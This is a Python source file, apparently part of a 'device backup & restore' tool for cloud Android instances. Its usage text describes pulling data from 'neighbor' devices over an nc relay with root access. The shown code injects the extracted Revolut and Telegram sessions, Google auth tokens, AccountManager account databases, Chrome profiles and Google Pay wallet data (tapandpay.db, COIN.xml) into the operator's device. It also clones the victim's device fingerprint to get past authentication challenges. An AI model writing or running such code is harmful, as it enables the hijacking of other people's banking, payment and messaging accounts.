    print(f"\n  [2/5] Restoring app data...")

    apps_dir = os.path.join(clone_dir, "apps")
    if not os.path.exists(apps_dir):
        print("  [!] No apps directory in backup")
        return restore_log

    pkgs = list(report.get("packages", {}).keys())
    total = len(pkgs)
    t0 = time.time()

    for idx, pkg in enumerate(pkgs, 1):
        pkg_info = report["packages"][pkg]
        if pkg_info.get("status") != "extracted":
            continue

        pkg_dir = os.path.join(apps_dir, pkg)
        if not os.path.exists(pkg_dir):
            continue

        elapsed = time.time() - t0
        print(f"\n  [{idx:3d}/{total}] {pkg}")
        app_log = {"status": "pending"}

        # ── Step 2a: Install APK if needed ──
        apk_path = os.path.join(pkg_dir, "base.apk")

        # Check if already installed via Cloud API
        check_installed = await cloud_cmd(client, OUR_PAD,
            f"pm path {pkg} 2>/dev/null | head -1")
        await asyncio.sleep(API_RATE_DELAY)

        if check_installed and "package:" in check_installed:
            print(f"    APK: Already installed")
            app_log["install"] = "existing"
        elif os.path.exists(apk_path) and os.path.getsize(apk_path) > 10240:
            sz = os.path.getsize(apk_path) / 1024 / 1024
            print(f"    Installing APK ({sz:.1f}M)...")

            if adb_available:
                # Push via ADB then install
                remote_apk = f"/data/local/tmp/restore_{pkg.replace('.','_')}.apk"
                if adb_push(ADB_BRIDGE, apk_path, remote_apk, 300):
                    # For large APKs (>10MB), use background install to avoid timeout
                    if sz > 10:
                        print(f"    Installing via background asyncCmd...")
                        success = await background_install_apk(client, OUR_PAD, remote_apk, pkg)
                    else:
                        result = await cloud_cmd(client, OUR_PAD,
                            f"pm install -r -g -d {remote_apk} 2>&1", timeout_sec=60)
                        await asyncio.sleep(API_RATE_DELAY)
                        success = "Success" in result

                    print(f"    Install: {'✓' if success else '✗ (failed)'}")
                    app_log["install"] = success

                    # Cleanup APK
                    await cloud_cmd(client, OUR_PAD, f"rm -f {remote_apk}")
                    await asyncio.sleep(API_RATE_DELAY)
                else:
                    print(f"    APK push failed")
                    app_log["install"] = False
            else:
                print(f"    No ADB bridge — skipping APK install")
                app_log["install"] = False
        else:
            # No APK and not installed
            if not check_installed:
                print(f"    No APK and not installed — skipping data")
                app_log["status"] = "skipped_no_apk"
                restore_log["apps"][pkg] = app_log
                continue

        # ── Step 2b: Force-stop app ──
        await cloud_cmd(client, OUR_PAD, f"am force-stop {pkg}")
        await asyncio.sleep(1)

        # ── Step 2c: Restore data tar (THE KEY FIX — uses syncCmd ROOT) ──
        data_tar = os.path.join(pkg_dir, "data.tar.gz")
        data_path = f"/data/data/{pkg}"

        if os.path.exists(data_tar):
            data_sz = os.path.getsize(data_tar) / 1024
            print(f"    Restoring data ({data_sz:.0f}K)...")

            remote_tar = f"/data/local/tmp/restore_data_{pkg.replace('.','_')}.tar.gz"

            # Push tar via ADB (to /data/local/tmp — no root needed)
            pushed = False
            # Re-check ADB before each large push (connection may have dropped)
            adb_available = adb_check(ADB_BRIDGE)
            if adb_available:
                pushed = adb_push(ADB_BRIDGE, data_tar, remote_tar, 300)

            if not pushed:
                # Fallback: base64 encode and write via syncCmd
                # Only practical for files < 1MB
                if data_sz < 1024:  # < 1MB
                    import base64
                    with open(data_tar, "rb") as f:
                        b64 = base64.b64encode(f.read()).decode()

                    # Write in chunks (syncCmd has ~4KB command limit)
                    chunk_size = 3000  # characters per chunk
                    chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]

                    await cloud_cmd(client, OUR_PAD, f"rm -f {remote_tar}")
                    await asyncio.sleep(API_RATE_DELAY)

                    for ci, chunk in enumerate(chunks):
                        op = ">>" if ci > 0 else ">"
                        await cloud_cmd(client, OUR_PAD,
                            f'echo -n "{chunk}" {op} {remote_tar}.b64',
                            timeout_sec=10)
                        await asyncio.sleep(API_RATE_DELAY)

                    await cloud_cmd(client, OUR_PAD,
                        f"base64 -d {remote_tar}.b64 > {remote_tar} && rm -f {remote_tar}.b64 && echo B64_OK",
                        timeout_sec=30)
                    await asyncio.sleep(API_RATE_DELAY)
                    pushed = True
                else:
                    print(f"    [!] File too large for base64 and no ADB — skipping")
                    app_log["data_restore"] = False
                    app_log["error"] = "no_push_method"
                    restore_log["apps"][pkg] = app_log
                    continue

            if pushed:
                # Extract tar — for large files use background extraction
                # syncCmd has ~2s server-side timeout that kills tar for >10MB
                if data_sz > 5120:  # > 5MB — use background extraction
                    print(f"    Extracting via background process (large file)...")
                    ok = await background_extract(client, OUR_PAD, remote_tar, data_path, pkg)
                else:
                    # Small files: direct syncCmd extraction works fine
                    extract_cmd = (
                        f"mkdir -p {data_path} && "
                        f"cd {data_path} && "
                        f"tar xzf {remote_tar} 2>&1 && "
                        f"echo EXTRACT_OK"
                    )
                    result = await cloud_cmd(client, OUR_PAD, extract_cmd, timeout_sec=60)
                    await asyncio.sleep(API_RATE_DELAY)
                    ok = "EXTRACT_OK" in result

                print(f"    Extract: {'✓' if ok else 'FAIL'}")
                app_log["data_restore"] = ok

                # Cleanup tar
                await cloud_cmd(client, OUR_PAD, f"rm -f {remote_tar}")
                await asyncio.sleep(API_RATE_DELAY)
            else:
                app_log["data_restore"] = False
        else:
            # Try individual files
            pushed = 0
            for subdir in ["databases", "shared_prefs", "files"]:
                sub_local = os.path.join(pkg_dir, subdir)
                if not os.path.exists(sub_local):
                    continue
                remote_sub = f"{data_path}/{subdir}"
                await cloud_cmd(client, OUR_PAD, f"mkdir -p {remote_sub}")
                await asyncio.sleep(API_RATE_DELAY)

                for fname in os.listdir(sub_local):
                    fpath = os.path.join(sub_local, fname)
                    if os.path.isfile(fpath) and adb_available:
                        remote_file = f"/data/local/tmp/restore_{fname}"
                        if adb_push(ADB_BRIDGE, fpath, remote_file, 30):
                            await cloud_cmd(client, OUR_PAD,
                                f"cp {remote_file} {remote_sub}/{fname} && rm -f {remote_file}")
                            await asyncio.sleep(API_RATE_DELAY)
                            pushed += 1

            print(f"    Pushed {pushed} individual files")
            app_log["data_restore"] = pushed > 0

        # ── Step 2d: Fix permissions via syncCmd (ROOT) ──
        # Get the correct UID for this package on OUR device
        uid_output = await cloud_cmd(client, OUR_PAD,
            f"dumpsys package {pkg} 2>/dev/null | grep 'userId=' | head -1")
        await asyncio.sleep(API_RATE_DELAY)

        uid = ""
        if uid_output and "userId=" in uid_output:
            try:
                uid = uid_output.split("userId=")[1].split()[0].strip()
            except (IndexError, ValueError):
                pass

        if not uid:
            # Try stat
            uid_output = await cloud_cmd(client, OUR_PAD,
                f"stat -c '%u' {data_path} 2>/dev/null")
            await asyncio.sleep(API_RATE_DELAY)
            if uid_output and uid_output.strip().isdigit():
                uid = uid_output.strip()

        if uid:
            perm_marker = f"/tmp/.perm_done_{pkg.replace('.', '_')}"
            perm_cmd = (
                f"nohup sh -c '"
                f"chown -R {uid}:{uid} {data_path}/ && "
                f"chmod -R 771 {data_path}/ && "
                f"restorecon -R {data_path}/ 2>/dev/null; "
                f"echo OK > {perm_marker}"
                f"' >/dev/null 2>&1 &"
            )
            await cloud_cmd(client, OUR_PAD, perm_cmd, timeout_sec=10)
            await asyncio.sleep(API_RATE_DELAY)

            # Poll for completion (max 30s — chown/chmod is fast for most dirs)
            ok = False
            for _ in range(10):
                await asyncio.sleep(3)
                check = await cloud_cmd(client, OUR_PAD, f"cat {perm_marker} 2>/dev/null")
                if check and "OK" in check:
                    await cloud_cmd(client, OUR_PAD, f"rm -f {perm_marker}")
                    ok = True
                    break
                await asyncio.sleep(API_RATE_DELAY)

            print(f"    Permissions: {'✓' if ok else 'FAIL'} (uid={uid})")
            app_log["permissions"] = ok
        else:
            print(f"    [!] Could not determine UID for {pkg}")
            app_log["permissions"] = False

        app_log["status"] = "restored"
        restore_log["apps"][pkg] = app_log

    # ═══════════════════════════════════════════════════════════════════
    # STEP 2b: Restore GMS shared_prefs (auth tokens) and databases
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n  [2b] Restoring GMS auth tokens and databases...")

    gms_prefs_dir = os.path.join(clone_dir, "gms_shared_prefs")
    if os.path.exists(gms_prefs_dir) and adb_available:
        gms_uid = await cloud_cmd(client, OUR_PAD,
            "stat -c '%u' /data/data/com.google.android.gms 2>/dev/null")
        await asyncio.sleep(API_RATE_DELAY)
        gms_uid = gms_uid.strip() if gms_uid and gms_uid.strip().isdigit() else ""

        await cloud_cmd(client, OUR_PAD, "am force-stop com.google.android.gms")
        await asyncio.sleep(1)

        pushed_prefs = 0
        for pref_file in os.listdir(gms_prefs_dir):
            fpath = os.path.join(gms_prefs_dir, pref_file)
            if not os.path.isfile(fpath) or os.path.getsize(fpath) == 0:
                continue
            tmp_r = f"/data/local/tmp/gmspref_{pref_file.replace(' ', '_')}"
            if adb_push(ADB_BRIDGE, fpath, tmp_r, 15):
                target = f"/data/data/com.google.android.gms/shared_prefs/{pref_file}"
                await cloud_cmd(client, OUR_PAD,
                    f"cp {tmp_r} '{target}' && rm -f {tmp_r}")
                await asyncio.sleep(API_RATE_DELAY)
                if gms_uid:
                    await cloud_cmd(client, OUR_PAD,
                        f"chown {gms_uid}:{gms_uid} '{target}' && chmod 660 '{target}'")
                    await asyncio.sleep(API_RATE_DELAY)
                pushed_prefs += 1
        print(f"    GMS shared_prefs: {pushed_prefs} files restored")

    gms_db_dir = os.path.join(clone_dir, "gms_databases")
    if os.path.exists(gms_db_dir) and adb_available:
        if not gms_uid:
            gms_uid = await cloud_cmd(client, OUR_PAD,
                "stat -c '%u' /data/data/com.google.android.gms 2>/dev/null")
            await asyncio.sleep(API_RATE_DELAY)
            gms_uid = gms_uid.strip() if gms_uid and gms_uid.strip().isdigit() else ""

        pushed_dbs = 0
        for db_file in os.listdir(gms_db_dir):
            fpath = os.path.join(gms_db_dir, db_file)
            if not os.path.isfile(fpath) or os.path.getsize(fpath) == 0:
                continue
            tmp_r = f"/data/local/tmp/gmsdb_{db_file.replace(' ', '_')}"
            if adb_push(ADB_BRIDGE, fpath, tmp_r, 30):
                target = f"/data/data/com.google.android.gms/databases/{db_file}"
                await cloud_cmd(client, OUR_PAD,
                    f"cp {tmp_r} '{target}' && rm -f {tmp_r}")
                await asyncio.sleep(API_RATE_DELAY)
                if gms_uid:
                    await cloud_cmd(client, OUR_PAD,
                        f"chown {gms_uid}:{gms_uid} '{target}'")
                    await asyncio.sleep(API_RATE_DELAY)
                pushed_dbs += 1
        print(f"    GMS databases: {pushed_dbs} files restored")

    # ── Inject AccountManager accounts (system accounts.db) ── 
    print(f"\n  [2c] Injecting Android AccountManager accounts...")
    gms_accts_dir = os.path.join(clone_dir, "gms_accounts")
    accounts_injected = 0
    if os.path.exists(gms_accts_dir):
        for fname in sorted(os.listdir(gms_accts_dir)):
            fpath = os.path.join(gms_accts_dir, fname)
            if not os.path.isfile(fpath) or os.path.getsize(fpath) == 0:
                continue
            # Reconstruct target path from filename (e.g. data_system_ce_0_accounts.db)
            # fname format: _data_system_ce_0_accounts.db
            target_path = "/" + fname.replace("_", "/", 1).lstrip("/")
            # Better: use known mapping
            if "system_ce_0_accounts" in fname:
                target_path = "/data/system_ce/0/accounts.db"
            elif "system_de_0_accounts" in fname:
                target_path = "/data/system_de/0/accounts.db"
            elif "system_users_0_accounts" in fname or "system_accounts" in fname:
                target_path = "/data/system/users/0/accounts.db"
            else:
                continue

            target_dir = os.path.dirname(target_path)
            tmp_r = "/data/local/tmp/restore_accounts.db"
            if adb_push(ADB_BRIDGE, fpath, tmp_r, 15):
                result = await cloud_cmd(client, OUR_PAD,
                    f"cp {tmp_r} {target_path} && "
                    f"chown 1000:1000 {target_path} && "
                    f"chmod 600 {target_path} && "
                    f"rm -f {tmp_r} && echo ACCT_OK")
                await asyncio.sleep(API_RATE_DELAY)
                if "ACCT_OK" in (result or ""):
                    print(f"    {target_path}: ✓ (AccountManager DB injected)")
                    accounts_injected += 1

    # Fallback: inject accounts via am broadcast if DB injection not available
    accounts = report.get("accounts", [])
    if accounts_injected == 0 and accounts:
        print(f"    DB injection skipped — signaling apps to re-register accounts...")
        for acct in accounts:
            acct_type = acct.get("type", "")
            acct_name = acct.get("name", "")
            # Map account type to package
            pkg_map = {
                "com.revolut.sso": "com.revolut.revolut",
                "com.revolut": "com.revolut.revolut",
                "org.telegram.messenger": "org.telegram.messenger.web",
                "com.google": "com.google.android.gms",
            }
            app_pkg = pkg_map.get(acct_type, "")
            if app_pkg:
                print(f"    Signaling {app_pkg} to reload account '{acct_name}'...")
                await cloud_cmd(client, OUR_PAD,
                    f"am broadcast -a android.accounts.LOGIN_ACCOUNTS_CHANGED "
                    f"--receiver-include-background 2>/dev/null")
                await asyncio.sleep(API_RATE_DELAY)

    if not accounts:
        print(f"    No accounts in backup to inject")
    else:
        print(f"    Accounts in backup: {len(accounts)} | DB injected: {accounts_injected}")

    # ═══════════════════════════════════════════════════════════════════
    # STEP 3: Restore Chrome data
    # ═══════════════════════════════════════════════════════════════════
    chrome_dir = os.path.join(clone_dir, "chrome_data")
    if os.path.exists(chrome_dir):
        print(f"\n  [3/5] Restoring Chrome data...")

        # Force-stop Chrome
        await cloud_cmd(client, OUR_PAD, "am force-stop com.android.chrome")
        await asyncio.sleep(1)

        chrome_default = "/data/data/com.android.chrome/app_chrome/Default"
        await cloud_cmd(client, OUR_PAD, f"mkdir -p {chrome_default}")
        await asyncio.sleep(API_RATE_DELAY)

        for db_file in os.listdir(chrome_dir):
            fpath = os.path.join(chrome_dir, db_file)
            if not os.path.isfile(fpath):
                continue

            remote_name = db_file.replace("_", " ").replace(".db", "")

            if adb_available:
                tmp_remote = f"/data/local/tmp/chrome_{db_file}"
                if adb_push(ADB_BRIDGE, fpath, tmp_remote, 30):
                    await cloud_cmd(client, OUR_PAD,
                        f"cp {tmp_remote} '{chrome_default}/{remote_name}' && rm -f {tmp_remote}")
                    await asyncio.sleep(API_RATE_DELAY)
                    print(f"    {remote_name}: ✓")

        # Fix Chrome permissions
        chrome_uid = await cloud_cmd(client, OUR_PAD,
            "stat -c '%u' /data/data/com.android.chrome 2>/dev/null")
        await asyncio.sleep(API_RATE_DELAY)

        if chrome_uid and chrome_uid.strip().isdigit():
            await cloud_cmd(client, OUR_PAD,
                f"chown -R {chrome_uid.strip()}:{chrome_uid.strip()} {chrome_default}/ && "
                f"restorecon -R /data/data/com.android.chrome/ 2>/dev/null && echo OK")
            await asyncio.sleep(API_RATE_DELAY)
            print(f"    Chrome permissions fixed")
    else:
        print(f"\n  [3/5] No Chrome data to restore")

    # ═══════════════════════════════════════════════════════════════════
    # STEP 4: Restore GMS data (tapandpay, COIN.xml)
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n  [4/5] Restoring GMS/wallet data...")

    # tapandpay.db
    tap_file = os.path.join(clone_dir, "tapandpay.db")
    if os.path.exists(tap_file) and adb_available:
        tmp_remote = "/data/local/tmp/restore_tapandpay.db"
        target_remote = "/data/data/com.google.android.gms/databases/tapandpay.db"

        if adb_push(ADB_BRIDGE, tap_file, tmp_remote, 30):
            await cloud_cmd(client, OUR_PAD,
                f"cp {tmp_remote} {target_remote} && rm -f {tmp_remote}")
            await asyncio.sleep(API_RATE_DELAY)

            gms_uid = await cloud_cmd(client, OUR_PAD,
                "stat -c '%u' /data/data/com.google.android.gms 2>/dev/null")
            await asyncio.sleep(API_RATE_DELAY)

            if gms_uid and gms_uid.strip().isdigit():
                await cloud_cmd(client, OUR_PAD,
                    f"chown {gms_uid.strip()}:{gms_uid.strip()} {target_remote}")
                await asyncio.sleep(API_RATE_DELAY)

            print(f"    tapandpay.db: ✓")
            restore_log["tapandpay"] = True

    # COIN.xml
    coin_file = os.path.join(clone_dir, "COIN.xml")
    if os.path.exists(coin_file):
        with open(coin_file) as f:
            coin_content = f.read()

        # Write COIN.xml via syncCmd (base64 for safety)
        import base64
        coin_b64 = base64.b64encode(coin_content.encode()).decode()
        target_path = "/data/data/com.google.android.gms/shared_prefs/COIN.xml"

        await cloud_cmd(client, OUR_PAD,
            f'echo "{coin_b64}" | base64 -d > {target_path}')
        await asyncio.sleep(API_RATE_DELAY)

        gms_uid = await cloud_cmd(client, OUR_PAD,
            "stat -c '%u' /data/data/com.google.android.gms 2>/dev/null")
        await asyncio.sleep(API_RATE_DELAY)

        if gms_uid and gms_uid.strip().isdigit():
            await cloud_cmd(client, OUR_PAD,
                f"chown {gms_uid.strip()}:{gms_uid.strip()} {target_path} && "
                f"chmod 660 {target_path}")
            await asyncio.sleep(API_RATE_DELAY)

        print(f"    COIN.xml: ✓")
        restore_log["coin_xml"] = True

    # GMS accounts databases
    gms_accts_dir = os.path.join(clone_dir, "gms_accounts")
    if os.path.exists(gms_accts_dir) and adb_available:
        for fname in os.listdir(gms_accts_dir):
            fpath = os.path.join(gms_accts_dir, fname)
            if not os.path.isfile(fpath):
                continue
            # Reconstruct target path from filename
            target = "/" + fname.replace("_", "/")
            tmp_remote = f"/data/local/tmp/restore_gms_{fname}"
            if adb_push(ADB_BRIDGE, fpath, tmp_remote, 15):
                await cloud_cmd(client, OUR_PAD,
                    f"cp {tmp_remote} {target} 2>/dev/null && rm -f {tmp_remote}")
                await asyncio.sleep(API_RATE_DELAY)
                print(f"    {target}: ✓")

    # ═══════════════════════════════════════════════════════════════════
    # STEP 4b: Restart apps to pick up restored sessions
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n  [4b] Restarting apps to activate restored sessions...")

    restart_order = [
        "com.google.android.gms",        # GMS first — provides auth for others
        "com.android.vending",            # Play Store
        "org.telegram.messenger.web",     # Telegram (session self-contained in tgnet.dat)
        "com.revolut.revolut",            # Revolut (session in accounts_db)
        "com.android.chrome",             # Chrome
    ]
    for rst_pkg in restart_order:
        pkg_path = await cloud_cmd(client, OUR_PAD,
            f"pm path {rst_pkg} 2>/dev/null | head -1")
        await asyncio.sleep(API_RATE_DELAY)
        if pkg_path and "package:" in pkg_path:
            await cloud_cmd(client, OUR_PAD, f"am force-stop {rst_pkg}")
            await asyncio.sleep(0.5)
            # Broadcast account change so AccountManager re-scans
            await cloud_cmd(client, OUR_PAD,
                f"am broadcast -a android.accounts.LOGIN_ACCOUNTS_CHANGED "
                f"--receiver-include-background 2>/dev/null")
            await asyncio.sleep(API_RATE_DELAY)
            print(f"    {rst_pkg}: restarted")

    # Restart GMS one more time after account broadcast
    await cloud_cmd(client, OUR_PAD, "am force-stop com.google.android.gms")
    await asyncio.sleep(2)
    await cloud_cmd(client, OUR_PAD,
        "am startservice com.google.android.gms/.checkin.CheckinService 2>/dev/null")
    await asyncio.sleep(API_RATE_DELAY)

    # ═══════════════════════════════════════════════════════════════════
    # STEP 5: Post-restore verification
    # ═══════════════════════════════════════════════════════════════════
    print(f"\n  [5/5] Post-restore verification...")

    # Verify key apps have data + check account registration
    verify_pkgs = [
        "com.revolut.revolut",
        "com.google.android.gms",
        "com.android.chrome",
        "org.telegram.messenger.web",
    ]
    for pkg in verify_pkgs:
        data_path = f"/data/data/{pkg}"
        check = await cloud_cmd(client, OUR_PAD,
            f"ls {data_path}/databases/ 2>/dev/null | wc -l")
        await asyncio.sleep(API_RATE_DELAY)
        db_count = check.strip() if check else "0"

        installed = await cloud_cmd(client, OUR_PAD,
            f"pm path {pkg} 2>/dev/null | head -1")
        await asyncio.sleep(API_RATE_DELAY)
        inst_flag = "installed" if (installed and "package:" in installed) else "NOT installed"

        status = "✓" if db_count not in ("0", "") else "✗"
        print(f"    {pkg}: {status} ({db_count} DBs | {inst_flag})")

    # Check AccountManager
    acct_check = await cloud_cmd(client, OUR_PAD,
        "dumpsys account 2>/dev/null | grep 'Accounts:'")
    await asyncio.sleep(API_RATE_DELAY)
    print(f"    AccountManager: {acct_check.strip() if acct_check else 'unknown'}")

    # ── Summary ──
    restored = sum(1 for a in restore_log["apps"].values() if a.get("status") == "restored")
    data_ok = sum(1 for a in restore_log["apps"].values() if a.get("data_restore"))

    restore_log["status"] = "complete"
    restore_log["completed"] = time.strftime("%Y-%m-%d %H:%M:%S")
    restore_log["summary"] = {
        "apps_restored": restored,
        "data_restored": data_ok,
        "total": total,
    }

    log_file = os.path.join(clone_dir, "restore_log_v2.json")
    with open(log_file, "w") as f:
        json.dump(restore_log, f, indent=2)

    print(f"\n{'═'*70}")
    print(f"  RESTORE COMPLETE (v2.0)")
    print(f"  Apps processed: {restored}/{total}")
    print(f"  Data restored:  {data_ok}/{total}")
    print(f"  Method: Cloud API syncCmd (ROOT)")
    print(f"  Log: {log_file}")
    print(f"{'═'*70}")
    print(f"\n  Next steps:")
    print(f"    1. Open Revolut/apps on device — sessions should persist")
    print(f"    2. If auth challenge: device fingerprint was cloned to match source")
    print(f"    3. Use 'status' command to verify device state")

    return restore_log


# ═══════════════════════════════════════════════════════════════════════
# FINGERPRINT ONLY (quick identity clone)
# ═══════════════════════════════════════════════════════════════════════

async def clone_fingerprint(client, target_ip):
    """Clone only the device fingerprint/identity from backup to our device."""
    clone_dir = os.path.join(CLONE_ROOT, target_ip.replace(".", "_"))

    fp_file = os.path.join(clone_dir, "fingerprint.json")
    props_file = os.path.join(clone_dir, "build.prop")

    if os.path.exists(fp_file):
        with open(fp_file) as f:
            fingerprint = json.load(f)
    elif os.path.exists(props_file):
        fingerprint = {}
        with open(props_file) as f:
            for line in f:
                line = line.strip()
                if line.startswith("[") and "]: [" in line:
                    key = line.split("]: [")[0].lstrip("[")
                    val = line.split("]: [")[1].rstrip("]")
                    if key in IDENTITY_PROPS + CLOUD_IDENTITY_PROPS and val:
                        fingerprint[key] = val
    else:
        print(f"[!] No fingerprint data found for {target_ip}")
        return

    print(f"\n{'═'*70}")
    print(f"  FINGERPRINT CLONE — {target_ip} → {OUR_PAD}")
    print(f"  Properties: {len(fingerprint)}")
    print(f"{'═'*70}")

    # Runtime properties (persist.*) — no restart
    runtime_props = {k: v for k, v in fingerprint.items()
                    if k.startswith("persist.")}

    if runtime_props:
        try:
            await client.modify_instance_properties([OUR_PAD], runtime_props)
            print(f"\n  Runtime properties: {len(runtime_props)} applied")
            for k, v in list(runtime_props.items())[:8]:
                print(f"    {k} = {v}")
            await asyncio.sleep(API_RATE_DELAY)
        except Exception as e:
            print(f"  Runtime props error: {e}")

    # Identity properties (ro.*) — via resetprop
    identity_props = {k: v for k, v in fingerprint.items()
                     if k.startswith("ro.")}

    if identity_props:
        for k, v in identity_props.items():
            await cloud_cmd(client, OUR_PAD,
                f'resetprop {k} "{v}" 2>/dev/null || setprop {k} "{v}" 2>/dev/null')
            await asyncio.sleep(API_RATE_DELAY)

        print(f"\n  Identity properties: {len(identity_props)} applied")
        for k, v in list(identity_props.items())[:8]:
            print(f"    {k} = {v}")

    print(f"\n  Fingerprint clone complete.")


# ═══════════════════════════════════════════════════════════════════════
# STATUS CHECK (verify device state)
# ═══════════════════════════════════════════════════════════════════════

async def check_status(client):
    """Check current device status and capabilities."""
    print(f"\n{'═'*70}")
    print(f"  DEVICE STATUS — {OUR_PAD}")
    print(f"{'═'*70}")

    # Cloud API test
    cloud_test = await cloud_cmd(client, OUR_PAD, "echo OK && id && getprop ro.product.model")
    await asyncio.sleep(API_RATE_DELAY)

    if cloud_test:
        lines = cloud_test.strip().split("\n")
        print(f"\n  Cloud API syncCmd: WORKING")
        for line in lines:
            if "uid=" in line:
                root = "ROOT" if "uid=0" in line else "NON-ROOT"
                print(f"  Shell identity: {root} ({line.strip()})")
            elif line.strip() and line.strip() not in ("OK",):
                print(f"  Device model: {line.strip()}")
    else:
        print(f"\n  Cloud API syncCmd: NOT RESPONDING")

    # ADB bridge test
    adb_test = adb(ADB_BRIDGE, "echo ADB_OK && id", 5)
    if "ADB_OK" in adb_test:
        print(f"  ADB bridge: CONNECTED")
        if "uid=0" in adb_test:
            print(f"  ADB root: YES")
        else:
            print(f"  ADB root: NO (use syncCmd for root operations)")
    else:
        print(f"  ADB bridge: NOT CONNECTED")

    # Device identity
    model = await cloud_cmd(client, OUR_PAD, "getprop ro.product.model")
    await asyncio.sleep(API_RATE_DELAY)
    brand = await cloud_cmd(client, OUR_PAD, "getprop ro.product.brand")
    await asyncio.sleep(API_RATE_DELAY)
    android = await cloud_cmd(client, OUR_PAD, "getprop ro.build.version.release")
    await asyncio.sleep(API_RATE_DELAY)

    print(f"\n  Identity: {brand} {model} (Android {android})")

    # Check installed apps
    installed = await cloud_cmd(client, OUR_PAD, "pm list packages -3 | wc -l")
    await asyncio.sleep(API_RATE_DELAY)
    print(f"  Third-party apps: {installed.strip()}")

    # Check key apps
    for pkg in ["com.revolut.revolut", "com.google.android.gms",
                "com.android.chrome", "org.telegram.messenger.web"]:
        check = await cloud_cmd(client, OUR_PAD, f"pm path {pkg} 2>/dev/null | head -1")
        await asyncio.sleep(API_RATE_DELAY)
        installed = "✓" if check and "package:" in check else "✗"
        print(f"    {pkg}: {installed}")

    # List backup directories
    print(f"\n  Available backups:")
    if os.path.exists(CLONE_ROOT):
        for d in os.listdir(CLONE_ROOT):
            report_file = os.path.join(CLONE_ROOT, d, "clone_report.json")
            if os.path.exists(report_file):
                with open(report_file) as f:
                    rep = json.load(f)
                ip = rep.get("target_ip", d)
                brand = rep.get("brand", "?")
                model = rep.get("model", "?")
                pkgs = len(rep.get("packages", {}))
                ts = rep.get("backed_up_at", rep.get("extracted_at", "?"))
                print(f"    {ip}: {brand} {model} — {pkgs} packages ({ts})")
    else:
        print(f"    None found")

    print(f"\n{'═'*70}")


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

async def main():
    if len(sys.argv) < 2:
        print("""
Device Backup & Restore v2.0
=============================

Usage:
  python3 scanning/device_backup_restore.py backup <TARGET_IP>        # Extract from neighbor
  python3 scanning/device_backup_restore.py restore <TARGET_IP>       # Restore to our device
  python3 scanning/device_backup_restore.py full <TARGET_IP>          # Backup + Restore
  python3 scanning/device_backup_restore.py fingerprint <TARGET_IP>   # Clone identity only
  python3 scanning/device_backup_restore.py status                    # Check device

Key improvements over v1:
  - Restore uses Cloud API syncCmd (ROOT) — fixes data_restore: false
  - Correct switchRoot format (rootEnable, not rootStatus/rootType)
  - Device fingerprint backup & restore via padProperties/updatePadProperties
  - Proper permission fixing via syncCmd root shell
  - Base64 fallback when ADB bridge unavailable

Architecture:
  BACKUP:  ADB bridge → nc relay → Neighbor (root access via relay)
  RESTORE: Cloud API syncCmd (ROOT) + ADB push to /data/local/tmp/
""")
        sys.exit(1)

    client = VMOSCloudClient(ak=AK, sk=SK, base_url="https://api.vmoscloud.com")

    action = sys.argv[1].lower()

    if action == "status":
        await check_status(client)

    elif action == "backup":
        if len(sys.argv) < 3:
            print("Usage: python3 scanning/device_backup_restore.py backup <TARGET_IP>")
            sys.exit(1)
        target_ip = sys.argv[2]
        await backup_device(client, target_ip)

    elif action == "restore":
        if len(sys.argv) < 3:
            print("Usage: python3 scanning/device_backup_restore.py restore <TARGET_IP>")
            sys.exit(1)
        target_ip = sys.argv[2]
        await restore_device(client, target_ip)

    elif action == "full":
        if len(sys.argv) < 3:
            print("Usage: python3 scanning/device_backup_restore.py full <TARGET_IP>")
            sys.exit(1)
        target_ip = sys.argv[2]
        report = await backup_device(client, target_ip)
        if report and report.get("status") == "backed_up":
            print(f"\n  {'─'*50}")
            print(f"  Backup complete. Starting restore in 5s...")
            print(f"  {'─'*50}")
            await asyncio.sleep(5)
            await restore_device(client, target_ip)

    elif action == "fingerprint":
        if len(sys.argv) < 3:
            print("Usage: python3 scanning/device_backup_restore.py fingerprint <TARGET_IP>")
            sys.exit(1)
        target_ip = sys.argv[2]
        await clone_fingerprint(client, target_ip)

    else:
        print(f"Unknown action: {action}")
        print("Actions: backup, restore, full, fingerprint, status")
        sys.exit(1)

    await client.close()


if __name__ == "__main__":
    asyncio.run(main())
